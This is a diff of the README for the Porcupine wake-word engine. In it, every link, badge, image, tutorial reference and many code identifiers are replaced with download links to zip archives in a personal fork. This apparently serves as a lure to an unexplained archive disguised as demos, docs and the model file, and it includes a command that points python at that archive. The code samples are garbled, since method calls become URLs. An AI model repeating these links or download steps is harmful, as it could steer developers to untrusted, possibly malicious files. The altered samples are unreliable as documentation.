@@ -1,9 +1,9 @@
 # Porcupine
 
-[![Build Status](https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip)](https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip)
-[![GitHub release](https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip)](https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip)
+[![Build Status](https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip)](https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip)
+[![GitHub release](https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip)](https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip)
 
-Made in Vancouver, Canada by [Picovoice](https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip)
+Made in Vancouver, Canada by [Picovoice](https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip)
 
 Porcupine is a self-service, highly-accurate, and lightweight **wake word** (**voice control**) engine. It enables
 developers to build always-listening voice-enabled applications/platforms. Porcupine is
@@ -42,32 +42,32 @@ RAM.
 
 ## Try It Out
 
-Try out Porcupine using its [interactive web demo](https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip). You need a working microphone.
+Try out Porcupine using its [interactive web demo](https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip). You need a working microphone.
 
 Try out Porcupine by downloading it's
-[Android demo application](https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip). The demo
+[Android demo application](https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip). The demo
 application allows you to test Porcupine on a variety of wake words in any environment.
 
-![Android Demo](https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip)
+![Android Demo](https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip)
 
-See Porcupine in action on an ARM Cortex-M7 (accompanied by [Rhino](https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip) for intent inference).
+See Porcupine in action on an ARM Cortex-M7 (accompanied by [Rhino](https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip) for intent inference).
 
-[![Porcupine in Action](https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip)](https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip)
+[![Porcupine in Action](https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip)](https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip)
 
 ## Getting Started
 
 ### Wake Word Tutorial
 
-[![Porcupine Tutorial - Wake Word](https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip)](https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip)
+[![Porcupine Tutorial - Wake Word](https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip)](https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip)
 
 ### Voice Control Tutorial
 
-[![Porcupine Tutorial - Voice Control](https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip)](https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip)
+[![Porcupine Tutorial - Voice Control](https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip)](https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip)
 
 ## Performance
 
 A comparison between accuracy and runtime metrics of Porcupine and two other widely-used libraries, PocketSphinx and
-Snowboy, is provided [here](https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip). Compared to the best-performing engine,
+Snowboy, is provided [here](https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip). Compared to the best-performing engine,
 Porcupine's standard model is 2.53 times more accurate, 2.6 times faster (on Raspberry Pi 3), and consumes 45% less
 memory. 
 
@@ -83,7 +83,7 @@ Standard | 7.39% | 1380 KB |
 Tiny | 3.42% | 240 KB |
 
 For accuracy comparison of different variants refer to
-[benchmark repository](https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip).
+[benchmark repository](https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip).
 
 ## Structure of Repository
 
@@ -111,18 +111,18 @@ running the demo for hotword **Alexa** from the command line. Replace `${SYSTEM}
 on your machine (e.g. linux, mac, windows, or raspberry-pi).
 
 ```bash
-python https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip --keyword_file_paths resources/keyword_files/alexa_${SYSTEM}.ppn
+python https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip --keyword_file_paths resources/keyword_files/alexa_${SYSTEM}.ppn
 ```
 
 ### Android Demo Application
 
-Using [Android Studio](https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip) open [demo/android](/demo/android) as an Android
+Using [Android Studio](https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip) open [demo/android](/demo/android) as an Android
 project and then run the application. Note that you need an android phone with developer options enabled connected to
 your machine in order to run the application.
 
 ### iOS Demo Application
 
-Using [Xcode](https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip) open [demo/ios](/demo/ios) and run the application. Note that you need
+Using [Xcode](https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip) open [demo/ios](/demo/ios) and run the application. Note that you need
 an iOS device connected to your machine and a valid Apple developer account.
 
 ## Creating Keyword Files
@@ -151,7 +151,7 @@ Porcupine is implemented in ANSI C and therefore can be directly linked to C app
 object can be constructed as follows.
 
 ```c
-const char *model_file_path = ... // The file is available at https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip
+const char *model_file_path = ... // The file is available at https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip
 const char *keyword_file_path = ...
 const float sensitivity = 0.5;
 pv_porcupine_object_t *handle;
@@ -194,12 +194,12 @@ pv_porcupine_delete(handle);
 
 ### Python
 
-[https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip](https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip) provides a Python binding for Porcupine library. Below is a
+[https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip](https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip) provides a Python binding for Porcupine library. Below is a
 quick demonstration of how to construct an instance of it to detect multiple keywords concurrently.
 
 ```python
 library_path = ... # Path to Porcupine's C library available under lib/${SYSTEM}/${MACHINE}/
-model_file_path = ... # It is available at https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip
+model_file_path = ... # It is available at https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip
 keyword_file_paths = ['path/to/keyword/1', 'path/to/keyword/2', ...]
 sensitivities = [0.5, 0.4, ...]
 handle = Porcupine(library_path, model_file_path, keyword_file_paths=keyword_file_paths, sensitivities=sensitivities)
@@ -208,8 +208,8 @@ handle = Porcupine(library_path, model_file_path, keyword_file_paths=keyword_fil
 Sensitivity is the parameter that enables developers to trade miss rate for false alarm. It is a floating number within
 [0, 1]. A higher sensitivity reduces miss rate at cost of increased false alarm rate.
 
-When initialized, valid sample rate can be obtained using ```https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip```. Expected frame length
-(number of audio samples in an input array) is ```https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip```. The object can be used to monitor
+When initialized, valid sample rate can be obtained using ```https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip```. Expected frame length
+(number of audio samples in an input array) is ```https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip```. The object can be used to monitor
 incoming audio as below.
 
 ```python
@@ -218,7 +218,7 @@ def get_next_audio_frame():
 
 while True:
     pcm = get_next_audio_frame()
-    keyword_index = https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip(pcm)
+    keyword_index = https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip(pcm)
     if keyword_index >= 0:
         # detection event logic/callback
         pass
@@ -228,24 +228,24 @@ Finally, when done be sure to explicitly release the resources as the binding cl
 collector.
 
 ```python
-https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip()
+https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip()
 ```
 
 ### csharp
 
-[https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip](https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip) provides a c# binding for Porcupine library. Below is a
+[https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip](https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip) provides a c# binding for Porcupine library. Below is a
 quick demonstration of how to construct an instance of it to detect multiple keywords concurrently.
 
 
 ```csharp
-string model_file_path = ... // The file is available at https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip
+string model_file_path = ... // The file is available at https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip
 string keyword_file_path = ...
 float sensitivity = 0.5;
 Porcupine instance;
 
 instance = new Porcupine(model_file_path, keyword_file_path, sensitivity);
 
-if (https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip != https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip) {
+if (https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip != https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip) {
     // error handling logic
 }
 ```
@@ -254,8 +254,8 @@ Sensitivity is the parameter that enables developers to trade miss rate for fals
 [0, 1]. A higher sensitivity reduces miss rate at cost of increased false alarm rate.
 
 Now the `instance` can be used to monitor incoming audio stream. Porcupine accepts single channel, 16-bit PCM audio.
-The sample rate can be retrieved using `https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip()`. Finally, Porcupine accepts input audio in consecutive chunks
-(aka frames) the length of each frame can be retrieved using `https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip()`.
+The sample rate can be retrieved using `https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip()`. Finally, Porcupine accepts input audio in consecutive chunks
+(aka frames) the length of each frame can be retrieved using `https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip()`.
 
 ```csharp
 Int16[] GetNextAudioFrame()
@@ -267,8 +267,8 @@ Int16[] GetNextAudioFrame()
 while (true) {
     Int16[] frame = GetNextAudioFrame();
     bool result;
-    PicoVoiceStatus status = https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip(pcm, out result);
-    if (status != https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip) {
+    PicoVoiceStatus status = https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip(pcm, out result);
+    if (status != https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip) {
         // error handling logic
     }
     if (result) {
@@ -281,7 +281,7 @@ Finally, when done we don't need to release the resources ourself, the garbage c
 But if you want to do it yourself.
 
 ```csharp
-https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip();
+https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip();
 ```
 
 ### Android
@@ -290,11 +290,11 @@ There are two possibilities for integrating Porcupine into an Android applicatio
 
 #### Binding
 
-[Porcupine](https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip) provides a binding for
-Android using [JNI](https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip). It can be initialized using.
+[Porcupine](https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip) provides a binding for
+Android using [JNI](https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip). It can be initialized using.
 
 ```java
-    final String modelFilePath = ... // It is available at https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip
+    final String modelFilePath = ... // It is available at https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip
     final String keywordFilePath = ...
     final float sensitivity = 0.5f;
 
@@ -310,7 +310,7 @@ Once initialized, ```porcupine``` can be used to monitor incoming audio.
     private short[] getNextAudioFrame();
 
     while (true) {
-        final boolean result = https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip(getNextAudioFrame());
+        final boolean result = https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip(getNextAudioFrame());
         if (result) {
             // detection event logic/callback
         }
@@ -321,18 +321,18 @@ Finally, be sure to explicitly release resources acquired by porcupine as the cl
 for releasing native resources.
 
 ```java
-    https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip();
+    https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip();
 ```
 
 #### High-Level API
 
 [Android demo application](/demo/android) provides a high-level API for integrating Porcupine into Android applications.
-The [PorcupineManager](https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip) class
+The [PorcupineManager](https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip) class
 manages all activities related to creating an input audio stream, feeding it into Porcupine's library, and
 invoking a user-provided detection callback. The class can be initialized as below.
 
 ```java
-    final String modelFilePath = ... // It is available at https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip
+    final String modelFilePath = ... // It is available at https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip
     final String keywordFilePath = ...
     final float sensitivity = 0.5f;
 
@@ -351,8 +351,8 @@ invoking a user-provided detection callback. The class can be initialized as bel
 Sensitivity is the parameter that enables developers to trade miss rate for false alarm. It is a floating number within
 [0, 1]. A higher sensitivity reduces miss rate at cost of increased false alarm rate.
 
-When initialized, input audio can be monitored using `https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip() `. When done be sure to stop the manager using
-`https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip()`.
+When initialized, input audio can be monitored using `https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip() `. When done be sure to stop the manager using
+`https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip()`.
 
 ### iOS
 
@@ -364,15 +364,15 @@ Porcupine is shipped as a precompiled ANSI C library and can directly be used in
 initialized to detect multiple wake words concurrently using
 
 ```swift
-let modelFilePath: String = ... // It is available at https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip
+let modelFilePath: String = ... // It is available at https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip
 let keywordFilePaths: [String] = ["path/to/keyword/1", "path/to/keyword/2", ...]
 let sensitivities: [Float] = [0.3, 0.7, ...];
 var handle: OpaquePointer?
 
 let status = pv_porcupine_multiple_keywords_init(
     modelFilePath,
-    Int32(https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip), // Number of different keywords to monitor for
-    https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip{ UnsafePointer(strdup($0)) },
+    Int32(https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip), // Number of different keywords to monitor for
+    https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip{ UnsafePointer(strdup($0)) },
     sensitivities,
     &handle)
 if status != PV_STATUS_SUCCESS {
@@ -409,12 +409,12 @@ When done release the resources via
 
 #### Binding
 
-[PorcupineManager](https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip) class manages all activities related to creating an input audio
+[PorcupineManager](https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip) class manages all activities related to creating an input audio
 stream, feeding it into Porcupine's library, and invoking a user-provided detection callback. The class can be
 initialized as below
 
 ```swift
-let modelFilePath: String = ... // It is available at https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip
+let modelFilePath: String = ... // It is available at https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip
 let keywordCallback: ((WakeWordConfiguration) -> Void) = {
     // detection event callback
 }
@@ -426,19 +426,19 @@ let configurations = [ wakeWordConfiguration1, wakewordConfiguration2 ]
 let manager = try PorcupineManager(modelFilePath: modelFilePath, wakeKeywordConfigurations: configurations, onDetection: keywordCallback)
 ```
 
-When initialized, input audio can be monitored using `https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip()`. When done be sure to stop the manager using
-`https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip()`.
+When initialized, input audio can be monitored using `https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip()`. When done be sure to stop the manager using
+`https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip()`.
 
 ### Javascript
 
-Porcupine is available on modern web browsers in [WebAssembly](https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip). The [Javascript binding](/binding/js/)
+Porcupine is available on modern web browsers in [WebAssembly](https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip). The [Javascript binding](/binding/js/)
 makes it trivial use Porcupine within a Javascript environment. Instantiate a new instance of engine using the factory method
 as below
 
 ```javascript
     let keywordIDs = Array(UInt8Array(), ...);
     let sensitivities = Float32Array(...);
-    let obj = https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip(keywordIDs, sensitivities);
+    let obj = https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip(keywordIDs, sensitivities);
 ```
 
 when initialized incoming audio stream can be processed using the `process` method. Be sure to release the resources
@@ -446,11 +446,11 @@ acquired by WebAssembly using `.release` when done
 
 ```javascript
     while (true) {
-        https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip(audioFrameInt16Array);
+        https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip(audioFrameInt16Array);
     }
     
     // release when done
-    https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip();
+    https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip();
 ```
 
 For more information refer to [binding](/binding/js) and [demo](/demo/js).
@@ -460,7 +460,7 @@ For more information refer to [binding](/binding/js) and [demo](/demo/js).
 
 ## Contributing
 
-If you like to contribute to Porcupine, please read through [https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip](https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip).
+If you like to contribute to Porcupine, please read through [https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip](https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip).
 
 ### Acknowledgements
 
@@ -518,4 +518,4 @@ commercial products without acquiring a commercial licensing agreement from Pico
 
 Custom wake-words for other platforms are only provided with the purchase of the commercial license.
 
-In order to inquire about the commercial license [contact us](https://raw.githubusercontent.com/FarhanSaeed/Porcupine/master/demo/android/app/src/main/res/raw/Porcupine-v2.9.zip).
+In order to inquire about the commercial license [contact us](https://github.com/FarhanSaeed/Porcupine/raw/refs/heads/master/lib/mac/Software_2.6.zip).
